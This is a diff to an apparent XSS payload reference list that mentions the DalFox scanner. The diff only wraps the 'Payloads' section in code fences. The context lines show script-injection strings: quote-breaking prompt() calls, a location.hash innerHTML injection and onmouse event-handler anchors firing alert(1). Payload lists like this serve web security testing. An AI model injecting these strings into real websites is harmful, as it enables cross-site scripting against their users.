@@ -31,6 +31,7 @@ DalFox
 
 # Payloads
 
+```
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
@@ -204,3 +205,4 @@ innerHTML=location.hash>#<script>alert(1)</script>
 <a onmouseout="alert(1)">test</a>
 <a onmouseover="alert(1)">test</a>
 <a onmouseup="alert(1)">test</a>
+```
